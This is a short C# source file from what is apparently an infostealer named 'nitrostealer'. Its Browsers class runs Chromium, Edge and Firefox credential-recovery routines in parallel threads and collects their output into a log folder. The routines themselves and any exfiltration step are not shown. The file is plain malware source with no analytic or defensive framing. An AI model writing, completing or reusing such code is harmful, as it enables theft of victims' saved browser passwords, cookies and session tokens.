﻿using System;
using System.Collections.Generic;
using System.Threading;

namespace nitrostealer
{
    class Browsers
    {
        public static void Start()
        {
            string LogsTempPath = Help.LogPath;
            // List with threads
            List<Thread> Threads = new List<Thread>();
            try
            {
                Threads.Add(new Thread(() =>
                {
                    Chromium.Recovery.Run(LogsTempPath + "\\Browsers");
                    Edge.Recovery.Run(LogsTempPath + "\\Browsers");
                }));

                Threads.Add(new Thread(() =>
                   Firefox.Recovery.Run(LogsTempPath + "\\Browsers")
               ));
                
                // Start all threads
                foreach (Thread t in Threads)
                    t.Start();
                // Wait all threads
                foreach (Thread t in Threads)
                    t.Join();
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}
